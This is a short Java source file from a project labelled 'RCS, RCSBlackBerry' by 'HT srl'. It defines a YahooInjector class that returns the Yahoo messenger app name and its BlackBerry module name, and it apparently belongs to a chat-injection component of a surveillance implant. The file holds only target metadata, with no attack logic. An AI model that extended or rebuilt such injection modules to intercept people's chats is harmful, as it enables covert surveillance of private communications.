//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class YahooInjector extends ChatGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("YahooInjector", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif

    public String getAppName() {
        // Y.1=Yahoo
        return Messages.getString("Y.1"); //$NON-NLS-1$
    }

    public String getCodName() {
        // Y.2=net_rim_bb_qm_yahoo
        return Messages.getString("Y.2"); //$NON-NLS-1$
    }

}
